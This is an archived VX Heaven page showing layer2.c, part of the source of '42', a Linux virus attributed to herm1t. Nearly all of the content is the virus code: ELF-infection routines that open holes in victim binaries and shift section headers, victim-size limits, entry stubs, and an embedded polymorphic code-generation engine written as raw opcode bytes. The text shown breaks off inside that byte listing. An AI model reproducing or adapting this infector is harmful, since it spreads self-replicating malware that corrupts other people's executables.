<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>42 - Virus for Linux written by herm1t (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content=""/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири"/>
<meta name="Description" content="VX Heaven site is dedicted to providing information about computer viruses (virii) and web space for virus authors and groups"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"5b9e061b525269fcecb6bd38288ce5d672a5a506-1498759750-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div><div style="float:right;"><a href="/src_view.php?tbs=0"><img src="/img/min.gif" alt="Minimize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: left;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="32" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><br clear="both"/></div>
<div class="s2"><h1>Source code of computer viruses</h1><h2>42</h2><p><em>Virus for Linux</em></p><p><strong>herm1t</strong><br/><small><a href="/src.php?author=herm1t">Show all viruses by this author</a></small></p><small><a href="/src.php?info=42.zip">Description and download</a></small><br/><p>2008-08-08</p><h2>layer2.c</h2> [<a href="/src_view.php?file=42.zip">Index</a>] [<a href="/src_view.php?file=42.zip&amp;view=layer2.c&amp;highlight=off">Turn off syntax highlighting</a>] <hr/><pre class="c" style="font-family:monospace;color: #000066; background-color: #cccbbb;"><span style="color: #339933;">#include &lt;elf.h&gt;</span>
<span style="color: #339933;">#include &lt;stdint.h&gt;</span>
<span style="color: #339933;">#include &lt;signal.h&gt;</span>
<span style="color: #339933;">#include &lt;sys/mman.h&gt;</span>
<span style="color: #339933;">#include &lt;sys/stat.h&gt;</span>
<span style="color: #339933;">#include &lt;linux/types.h&gt;</span>
<span style="color: #339933;">#include &lt;linux/dirent.h&gt;</span>
&nbsp;
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.globl fake_host; fake_host: mov $1,%eax; mov $0, %ebx; int $0x80&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> <span style="color: black;">&#123;</span>
	<span style="color: #993333;">uint32_t</span> layer1_addr<span style="color: #339933;">,</span> layer1_size<span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> layer2_addr<span style="color: #339933;">,</span> layer2_size<span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> random<span style="color: #339933;">,</span> seed<span style="color: #339933;">,</span> trash<span style="color: #339933;">;</span>
	<span style="color: #993333;">char</span> <span style="color: #339933;">*</span>lastbrk<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>savebrk<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span> globals<span style="color: #339933;">;</span>
<span style="color: #993333;">register</span> globals <span style="color: #339933;">*</span>g asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;ebp&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">void</span> virus_start<span style="color: #339933;">;</span>
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">void</span> virus_end<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.globl virus_start; virus_start: call virus; .byte 0x68; .long fake_host; ret&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;
<span style="color: #339933;">#include &quot;syscalls.h&quot;</span>
<span style="color: #339933;">#ifdef	DEBUG</span>
<span style="color: #339933;">#include &quot;debug.c&quot;</span>
<span style="color: #339933;">#endif</span>
&nbsp;
<span style="color: #339933;">#define	MIN_VICTIM_SIZE	1024</span>
<span style="color: #339933;">#define	MAX_VICTIM_SIZE	1024*1024</span>
<span style="color: #339933;">#define	ELFOSABI_TARGET	ELFOSABI_LINUX</span>
<span style="color: #339933;">#define	PAGE_SIZE	4096</span>
&nbsp;
<span style="color: #339933;">#define	MAKE_HOLE(off,size) do {			\
	ftruncate(h,l+size);				\
	m = (char*)mremap(m,l,l + size, 0);		\
	if (m == MAP_FAILED) {				\
		goto _close;				\
	}						\
	if (off &lt; l)					\
		memmove(m+off+size, m+off, l-off);	\
	l += size;					\
} while(0)</span>
<span style="color: #339933;">#define	SHIFT_SHDRS(offset,delta) do {			\
	if (ehdr-&gt;e_shoff &gt;= offset)			\
		ehdr-&gt;e_shoff += delta;			\
	shdr = (Elf32_Shdr*)(m + ehdr-&gt;e_shoff);	\
	for (i = 0; i &lt; ehdr-&gt;e_shnum; i++)		\
		if (shdr[i].sh_offset &gt;= offset)	\
			shdr[i].sh_offset += delta;	\
} while(0)</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">uint32_t</span> crc32c_intel<span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span> crc<span style="color: #339933;">,</span> <span style="color: #993333;">uint8_t</span> data<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span>
	crc <span style="color: #339933;">^=</span> data<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">8</span><span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		crc <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>crc <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">^</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>crc <span style="color: #339933;">&amp;</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">?</span> <span style="color: #208080;">0x82F63B78</span> <span style="color: #339933;">:</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> crc<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>dst<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>src<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> len<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> len<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		<span style="color: #339933;">*</span>dst<span style="color: #339933;">++</span> <span style="color: #339933;">=</span> <span style="color: #339933;">*</span>src<span style="color: #339933;">++;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> bzero<span style="color: black;">&#40;</span><span style="color: #993333;">void</span> <span style="color: #339933;">*</span>dst<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> size<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> i<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> size<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span>
		<span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>dst <span style="color: #339933;">+</span> i<span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/strcmp.html"><span style="color: #000066;">strcmp</span></a><span style="color: black;">&#40;</span><span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>s1<span style="color: #339933;">,</span> <span style="color: #993333;">const</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>s2<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">int</span> ret <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: #339933;">!</span><span style="color: black;">&#40;</span>ret <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span> s1 <span style="color: #339933;">-</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span><span style="color: black;">&#41;</span> s2<span style="color: black;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: #339933;">*</span>s2<span style="color: black;">&#41;</span>
		<span style="color: #339933;">++</span>s1<span style="color: #339933;">,</span> <span style="color: #339933;">++</span>s2<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ret <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>
		ret <span style="color: #339933;">=</span> <span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">else</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ret <span style="color: #339933;">&gt;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>
	        	ret <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span> <span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> ret<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memmove.html"><span style="color: #000066;">memmove</span></a><span style="color: black;">&#40;</span><span style="color: #993333;">void</span> <span style="color: #339933;">*</span>dst_void<span style="color: #339933;">,</span> <span style="color: #993333;">void</span> <span style="color: #339933;">*</span>src_void<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> len<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">char</span> <span style="color: #339933;">*</span>dst <span style="color: #339933;">=</span> dst_void<span style="color: #339933;">;</span>
	<span style="color: #993333;">char</span> <span style="color: #339933;">*</span>src <span style="color: #339933;">=</span> src_void<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>src <span style="color: #339933;">&lt;</span> dst <span style="color: #339933;">&amp;&amp;</span> dst <span style="color: #339933;">&lt;</span> src <span style="color: #339933;">+</span> len<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		src <span style="color: #339933;">+=</span> len<span style="color: #339933;">;</span>
		dst <span style="color: #339933;">+=</span> len<span style="color: #339933;">;</span>
		<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>len<span style="color: #339933;">--</span><span style="color: black;">&#41;</span>
			<span style="color: #339933;">*--</span>dst <span style="color: #339933;">=</span> <span style="color: #339933;">*--</span>src<span style="color: #339933;">;</span>
	<span style="color: black;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span>
		<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>len<span style="color: #339933;">--</span><span style="color: black;">&#41;</span>
			<span style="color: #339933;">*</span>dst<span style="color: #339933;">++</span> <span style="color: #339933;">=</span> <span style="color: #339933;">*</span>src<span style="color: #339933;">++;</span>
	<span style="color: black;">&#125;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>sbrk<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> inc<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">char</span> <span style="color: #339933;">*</span>r<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>lastbrk <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		g<span style="color: #339933;">-&gt;</span>lastbrk <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>brk<span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		g<span style="color: #339933;">-&gt;</span>savebrk <span style="color: #339933;">=</span> g<span style="color: #339933;">-&gt;</span>lastbrk<span style="color: #339933;">;</span>
	<span style="color: black;">&#125;</span>
	r <span style="color: #339933;">=</span> g<span style="color: #339933;">-&gt;</span>lastbrk<span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>lastbrk <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>brk<span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>lastbrk <span style="color: #339933;">+</span> inc<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>lastbrk <span style="color: #339933;">!=</span> <span style="color: black;">&#40;</span>r <span style="color: #339933;">+</span> inc<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: #339933;">-</span><span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">return</span> r<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> elf_hash<span style="color: black;">&#40;</span><span style="color: #993333;">const</span> <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>name<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
	<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> h <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> g<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>name<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		h <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>h <span style="color: #339933;">&lt;&lt;</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #339933;">*</span>name<span style="color: #339933;">++;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>g <span style="color: #339933;">=</span> h <span style="color: #339933;">&amp;</span> <span style="color: #208080;">0xf0000000</span><span style="color: black;">&#41;</span>
			h <span style="color: #339933;">^=</span> g <span style="color: #339933;">&gt;&gt;</span> <span style="color: #0000dd;">24</span><span style="color: #339933;">;</span>
		h <span style="color: #339933;">&amp;=</span> ~g<span style="color: #339933;">;</span>
	<span style="color: black;">&#125;</span>
	<span style="color: #b1b100;">return</span> h<span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> build_hash<span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>hash<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> nbuckets<span style="color: #339933;">,</span> <span style="color: #993333;">int</span> nchains<span style="color: #339933;">,</span> Elf32_Sym <span style="color: #339933;">*</span>sym<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>str<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
	<span style="color: #993333;">uint32_t</span> i<span style="color: #339933;">,</span> h<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>buckets<span style="color: #339933;">,</span> <span style="color: #339933;">*</span>chains<span style="color: #339933;">;</span>
	buckets <span style="color: #339933;">=</span> hash <span style="color: #339933;">+</span> <span style="color: #0000dd;">2</span><span style="color: #339933;">;</span>
	chains  <span style="color: #339933;">=</span> buckets <span style="color: #339933;">+</span> nbuckets<span style="color: #339933;">;</span>
	hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> nbuckets<span style="color: #339933;">;</span>
	hash<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> nchains<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> nchains<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		h <span style="color: #339933;">=</span> elf_hash<span style="color: black;">&#40;</span>str <span style="color: #339933;">+</span> sym<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">st_name</span><span style="color: black;">&#41;</span> <span style="color: #339933;">%</span> nbuckets<span style="color: #339933;">;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>buckets<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>
			buckets<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> i<span style="color: #339933;">;</span>
		<span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span>
			h <span style="color: #339933;">=</span> buckets<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><span style="color: #339933;">;</span>
			<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>chains<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span> <span style="color: #339933;">!=</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>
				h <span style="color: #339933;">=</span> chains<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span><span style="color: #339933;">;</span>
			chains<span style="color: black;">&#91;</span>h<span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> i<span style="color: #339933;">;</span>
		<span style="color: black;">&#125;</span>
	<span style="color: black;">&#125;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #808080; font-style: italic;">/* CODEGEN/ETG engines by Z0mbie */</span>
<span style="color: #339933;">#define cmd_v_c         0       // cmd,v,c</span>
<span style="color: #339933;">#define cmd_v_v         1       // cmd,v1,v2</span>
<span style="color: #339933;">#define cmd_v_memv      2       // cmd,v1,[v2]</span>
<span style="color: #339933;">#define cmd_memv_v      3       // cmd,[v1],v2</span>
<span style="color: #339933;">#define cmd_r_r         4       // cmd,r1,r2</span>
<span style="color: #339933;">#define cmd_r_c         5       // cmd,r,c</span>
<span style="color: #339933;">#define cmd_r_memr      6       // cmd,r1,[r2]</span>
<span style="color: #339933;">#define cmd_memr_r      7       // cmd,[r1],r2</span>
<span style="color: #339933;">#define cmd_r_v         8       // cmd,r,v</span>
<span style="color: #339933;">#define cmd_v_r         9       // cmd,v,r</span>
<span style="color: black; font-style: italic;">// cmd means one of the following:</span>
<span style="color: #339933;">#define cmd_mov         0</span>
<span style="color: #339933;">#define cmd_add         1</span>
<span style="color: #339933;">#define cmd_sub         2</span>
<span style="color: #339933;">#define cmd_xor         3</span>
<span style="color: #339933;">#define cmd_cmp         4</span>
<span style="color: black; font-style: italic;">// v means offset</span>
<span style="color: black; font-style: italic;">// r means 32-bit register # (0..7)</span>
<span style="color: black; font-style: italic;">// c means dword-const</span>
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">int</span> cg<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;cg:&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC8,0x00,0x00,0x00,0x60,0x8B,0x7D,0x0C,0x8B,0x45,0x28,0xC7,0x45,0x28,0x8B,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0x0B,0xC0,0x74,0x28,0xC7,0x45,0x28,0x03,0x00,0x00,0x00,0x48,0x74,0x1E&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC7,0x45,0x28,0x2B,0x00,0x00,0x00,0x48,0x74,0x14,0xC7,0x45,0x28,0x33,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x48,0x74,0x0A,0xC7,0x45,0x28,0x3B,0x00,0x00,0x00,0x48,0x75,0x63,0x8B,0x45&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x24,0xFF,0x75,0x28,0xFF,0x75,0x2C,0xFF,0x75,0x30,0xE8,0x0B,0x00,0x00,0x00,0x2B&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x7D,0x0C,0x8B,0x45,0x10,0x89,0x38,0x61,0xC9,0xC3,0x0B,0xC0,0x0F,0x84,0x77,0x04&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0x48,0x0F,0x84,0xDF,0x04,0x00,0x00,0x48,0x0F,0x84,0x6F,0x05,0x00,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x48,0x0F,0x84,0x92,0x05,0x00,0x00,0x48,0x0F,0x84,0x14,0x01,0x00,0x00,0x48,0x0F&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x84,0xA9,0x01,0x00,0x00,0x48,0x0F,0x84,0xA3,0x02,0x00,0x00,0x48,0x0F,0x84,0xE2&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x02,0x00,0x00,0x48,0x0F,0x84,0x23,0x03,0x00,0x00,0x48,0x0F,0x84,0xA9,0x03,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0xCC,0xC3,0x83,0x7D,0x1C,0x00,0x74,0x12,0x60,0xFF,0x75,0x14,0x57,0xFF,0x75&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x08,0xFF,0x55,0x1C,0x83,0xC4,0x0C,0x89,0x04,0x24,0x61,0xC3,0x60,0x50,0xFF,0x75&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x08,0xFF,0x55,0x20,0x83,0xC4,0x08,0x89,0x44,0x24,0x1C,0x61,0x0B,0xC0,0xC3,0xB8&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x02,0x00,0x00,0x00,0xEB,0xE6,0xB8,0x03,0x00,0x00,0x00,0xEB,0xDF,0xB8,0x08,0x00&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x00,0x00,0xEB,0xD8,0xB8,0x00,0x01,0x00,0x00,0xEB,0xD1,0x50,0xE8,0xF3,0xFF,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0x88,0x04,0x24,0xE8,0xEB,0xFF,0xFF,0xFF,0x88,0x44,0x24,0x01,0xE8,0xE2,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xFF,0x88,0x44,0x24,0x02,0xE8,0xD9,0xFF,0xFF,0xFF,0x88,0x44,0x24,0x03,0x58&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xC3,0x83,0x7D,0x14,0x00,0x74,0x8A,0xE8,0xC1,0xFF,0xFF,0xFF,0x0F,0xB3,0x45,0x14&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x73,0xF5,0xC3,0x8B,0x44,0x24,0x04,0x0F,0xAB,0x45,0x14,0x0F,0x82,0x70,0xFF,0xFF&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0xFF,0xC2,0x04,0x00,0x83,0x7D,0x14,0x00,0x74,0x2B,0xE8,0x97,0xFF,0xFF,0xFF,0x75&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.byte 0x24,0xE8,0xCB,0xFF,0xFF,0xFF,0x51,0x91,0x68,0x8B,0x00,0x00,0x00,0x51,0xFF,0x74&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
